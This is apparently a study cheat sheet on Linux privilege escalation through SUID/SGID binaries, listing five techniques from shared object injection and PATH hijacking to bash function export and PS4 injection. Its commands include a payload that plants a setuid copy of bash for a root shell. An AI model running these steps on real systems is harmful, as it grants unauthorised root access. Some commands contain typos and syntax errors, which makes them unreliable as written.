SUID or SGID Executables


SUID - executed with the privileges of the file owner (User).
SGID - executed with the privileges of the file Group (Group).

Command to filnd SUID or SGID files located in the system.

find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

1) Known Exploits

Step 1: Find the uncommon SETUID binaries. (using script lse)

Step 2: Find in searchsploit, Google and github for exploits.

Step 3: If we find any priv esc exploit transfer to the machine.

Step 4: Execute this command if got any ^M errors : sed -i -e "s/^M//" <exploit_file_name>
	(because of the exploit code was written using windows new line character)

Step 5: execute the exploit code. we will get a root shell.

______________________________________________________________________________________________

2) Shared Object Injection

The SUID bit enabled files do some operations in the system. It can load some of files which are shared
but not avalible. we will create such files and get a root shell.

Step 1: Identify that files using the above find command.

Step 2: use strace command to analyze what that file is doing. : strace <file_name>

Step 3: grep the unusuable data. : strace <file_name> 2>&1 | grep -iE "open|access|no such file" 

Step 4: It will shows the list of files that are open,access, no such file. Identify any file that is 
	user writable and replace file contents with root gain code.

Step 5: Run that SUID file. we will get a root shell.

______________________________________________________________________________________________


3) Finding Vulnerable Programs

The SUID bit enabled files do some operations in the system. It will use some command operations in the file.
we will replace that command with our file by modifing the path. so our given path folder will be used firstly 
to load the commad.


Step 1: find vulnerable programs with strings, strace and ltrace

strings <file_name>, starce -v -f -e execute <command> 2>&1 | grep exec, ltrace <command>

Step 2: Identify the service commands with the step1. which is also using the path along with.

Step 3: create a c file that gives us a shell and save.

Step 4: run with gcc. (gcc -o service service.c) - sevice is the command used in the program and .c is our created.

Step 5: set the path to the file location. : PATH=.:$PATH <file_path>

Step 6: we will get the root shell.


______________________________________________________________________________________________

4) Absuing Shell Features

It is same as like the 3rd above method. But in this case it is using a older version of bash < 4.2.
That is vulnerable to create user define functions with an absoulte path name.

we use these functions to be exported so that subprocess have access to them and tahe precedence over actual.



Step 1: find vulnerable programs with strings, strace and ltrace

strings <file_name>, starce -v -f -e execute <command> 2>&1 | grep exec, ltrace <command>

Step 2: Identify the service commands with the step1. which is also using the path along with. we can see an absolute path in the command.

Step 3: identify the bash version. if it is < 4.2 it is vulnerable to create userdefine functions.

Step 4: create a function. : function <absolute_path_we found> {/bin/bash -p: }

Step 5: export the file. : export -f /usr/sbin/service

Step 6: Finally execute that file (step1). we will get a root shell.

______________________________________________________________________________________________

5) Absuing Shell Features (2)

If a SUID file runs another program via Bash (e.g. by using system() ) these environment variables can be inherited.
If an SUID file is being executed, this command will execute with the privileges of the file owner.
works only < 4.4 of bash.


Step 1: find vulnerable programs with strings, strace and ltrace

strings <file_name>, starce -v -f -e execute <command> 2>&1 | grep exec, ltrace <command>

Step 2: Identify the service commands with the step1. we can see it is using usr/bash 

Step 3: identify the bash version. if it is < 4.4 it is inherit PS4 to env var.

Step 4: env -i SHELLOPTS=xtrace PS4 ='<test>' <path_of_the_file>(step1). we can see that it is prepended the <test> to each line. so we use it to copy the bash file

Step 5: env -i SHELLOPTS=xtrace PS4 ='cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' <path_of_the_file>

Step 6: Finally execute /rootbash that we created. we will get the root shell.
 
